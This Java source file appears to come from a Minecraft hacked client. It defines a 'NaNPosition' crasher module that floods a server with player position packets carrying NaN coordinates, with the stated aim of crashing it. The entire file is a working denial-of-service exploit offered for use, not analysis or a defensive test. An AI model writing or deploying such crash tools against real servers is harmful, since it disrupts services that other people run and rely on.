package com.skidding.atlas.primitive.impl.exploit;

import com.skidding.atlas.module.ModuleCategory;
import com.skidding.atlas.primitive.PrimitiveFeature;
import com.skidding.atlas.primitive.argument.Argument;
import com.skidding.atlas.util.minecraft.chat.ChatUtil;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;

public class NaNPositionPrimitive extends PrimitiveFeature {

    public NaNPositionPrimitive() {
        super("NaNPosition", "Attempts to crash the server by sending position packets with NaN as a parameter", ModuleCategory.CRASHER, new Argument("Packets", 0, Integer.class));
    }

    @Override
    public void execute(Object... args) {
        long start = System.currentTimeMillis();
        int packets = (int) args[0];

        for (int i = 0; i < packets; i++) {
            getPlayer().sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Double.NaN, Double.NaN, Double.NaN, true));
        }

        ChatUtil.print(STR."Sent \{packets} packets in \{System.currentTimeMillis() - start}ms");
    }
}
